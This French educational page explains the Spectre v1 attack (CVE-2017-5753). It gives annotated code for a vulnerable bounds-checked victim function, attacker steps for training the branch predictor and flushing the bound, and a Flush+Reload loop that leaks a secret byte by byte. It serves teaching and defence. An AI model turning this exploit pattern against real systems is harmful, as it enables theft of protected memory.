Vulnérabilité CVE-2017-5753

L'attaque Spectre v1

Mécanisme complet, code vulnérable annoté, scénario d'attaque pas à pas.

Vue d'ensemble

Spectre en trois phases

Spectre v1 combine prédiction de branchement, exécution spéculative hors limites, et Flush+Reload pour exfiltrer des données normalement inaccessibles.

🎓

Phase 1 — Entraînement

Appeler la fonction vulnérable avec des entrées valides (x < array1_size) pour que le Branch Predictor Unit (BPU) apprenne à prédire "branche prise".

👻

Phase 2 — Exploitation

Appeler avec x hors-limites (pointant vers un secret). Le BPU prédit encore "pris" → spéculation → accès hors-limites → secret chargé en cache.

📡

Phase 3 — Exfiltration

Utiliser Flush+Reload pour mesurer quel index du tableau de sonde est en cache. L'index chaud = la valeur du secret.

Code vulnérable complet (Spectre v1)
/* ══ VARIABLES VICTIMES ══════════════════════════════════════════════════ */ unsigned int array1_size = 16; uint8_t array1[160]; // tableau d'accès légitimes uint8_t array2[256 * 512]; // tableau de sonde (probe array) char secret[] = "Mon secret EPFL"; // valeur à exfiltrer /* ══ FONCTION VICTIME ════════════════════════════════════════════════════ */ void victim_function(size_t x) { if (x < array1_size) { // ① garde de sécurité uint8_t val = array1[x]; // ② accès tableau volatile y = array2[val * 512]; // ③ encodage canal auxiliaire } // ← Si spéculatif : val = secret ! } /* ══ CODE ATTAQUANT ══════════════════════════════════════════════════════ */ // PHASE 1 : Entraîner le prédicteur avec des x valides for (int i = 0; i < 200; i++) victim_function(i % array1_size); // PHASE 2 : Exécution malveillante x_malveillant = (size_t)(secret - (char*)array1); // offset vers le secret _mm_clflush(&array1_size); // rendre la garde lente victim_function(x_malveillant); // → spéculation ! // PHASE 3 : Flush+Reload pour lire le cache for (int i = 0; i < 256; i++) { t = rdtscp_latency(&array2[i * 512]); if (t < THRESHOLD) leaked_value = i; // hit → secret ! }
Analyse détaillée

Pourquoi la garde de sécurité est inutile

La ligne if (x < array1_size) est censée protéger contre les accès hors-limites. Mais le processeur ne connaît pas encore la valeur de array1_size quand il commence à spéculer.

L'astuce clé de l'attaquant : vider array1_size du cache avec clflush(&array1_size). Maintenant le chargement de array1_size prend ~200 cycles. Pendant ces 200 cycles, le processeur spécule sur la base de sa prédiction — et exécute le corps du if avec x hors-limites.

Quand le résultat de array1_size arrive enfin et que la condition est évaluée comme fausse, l'exécution spéculative est annulée. Mais array2[secret_value * 512] est déjà en cache.

⚠ Timing Attack sur array1_size
En flushant array1_size, l'attaquant crée une fenêtre de spéculation artificielle. Plus la latence de chargement est grande, plus la fenêtre est large, et plus l'exécution spéculative avance loin dans le code hors-limites.
Scénario concret

Exfiltration octet par octet

En répétant l'attaque pour chaque octet du secret (en faisant varier x_malveillant), l'attaquant peut exfiltrer un secret de longueur arbitraire. Dans la pratique, on répète chaque byte ~1000 fois et on prend la valeur avec le plus grand nombre de hits.

/* Exfiltration de 'n' octets à partir de 'target_addr' */ for (int byte_idx = 0; byte_idx < n; byte_idx++) { int results[256] = {0}; for (int trial = 0; trial < 1000; trial++) { flush_probe_array(); // Flush train_branch_predictor(array1_size); // Train _mm_clflush(&array1_size); // Slow down guard victim_function(target_addr + byte_idx); // Exploit reload_and_count(results); // Reload } int best = argmax(results); printf("byte[%d] = 0x%02x ('%c')\n", byte_idx, best, best); }

~99% taux de succès typique
